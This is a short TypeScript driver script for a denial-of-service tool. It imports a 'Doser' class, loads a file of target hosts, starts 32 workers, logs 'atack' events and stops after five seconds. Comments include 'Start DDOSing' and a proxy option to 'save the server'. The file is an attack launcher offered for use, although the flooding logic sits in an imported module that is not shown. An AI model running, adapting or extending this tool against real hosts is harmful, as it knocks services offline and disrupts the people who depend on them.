import {Doser} from "./doser";

// Tutorial: https://khalilstemmler.com/blogs/typescript/node-starter-project/

const args = process.argv;
console.log('Script started: ', args);
let timeout = undefined;

function start() {
  const doser = new Doser(true, 32)
  doser.listen('atack', (data) => console.log(data.log))
  doser.listen('error', (data) => console.log(data.log))

  //Load targets
  doser.loadHostsFile().then(() => {
    doser.start()
  }).catch(() => {
    console.log('Error occurred while loading targets')
  })


  // doser.forceProxy(true); // Use proxy to save the server
  // doser.setWorkersCount(32); // Count of workers
  doser.start(); //Start DDOSing


  //Turn this script off after some time
  timeout = setTimeout(() => {
    doser.stop()
  }, 5000)
}

start();
